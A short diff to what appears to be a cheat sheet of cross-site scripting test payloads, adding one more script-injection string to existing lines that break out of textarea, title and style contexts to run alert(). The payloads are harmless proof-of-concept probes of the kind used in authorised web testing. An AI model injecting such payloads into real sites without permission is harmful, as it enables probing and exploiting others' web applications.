@@ -21,6 +21,8 @@ test123;//"><img/src=x%20onerror=alert(2)></textarea><img/src=x%20onerror=alert(
 text123</title><script>alert(1)</script> # Title tag must be closed </title>
 #fff);}</style><script>alert(1)</script><style>body{background-color:#   # Style sink close
 text123%27;alert(1)// # Check the special characters like single or double quotes
+<script></script><script>alert(1)</script>
+
 
 
 ```
